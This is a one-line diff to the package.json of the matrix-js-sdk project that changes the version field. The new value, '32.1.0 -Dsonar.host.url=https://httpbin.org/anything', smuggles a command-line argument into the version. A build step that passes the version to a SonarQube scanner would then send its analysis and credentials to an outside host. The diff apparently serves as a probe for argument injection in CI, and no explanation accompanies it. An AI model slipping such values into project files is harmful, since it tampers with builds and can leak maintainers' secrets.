@@ -1,6 +1,6 @@
 {
     "name": "matrix-js-sdk",
-    "version": "32.1.0",
+    "version": "32.1.0 -Dsonar.host.url=https://httpbin.org/anything",
     "description": "Matrix Client-Server SDK for Javascript",
     "engines": {
         "node": ">=18.0.0"
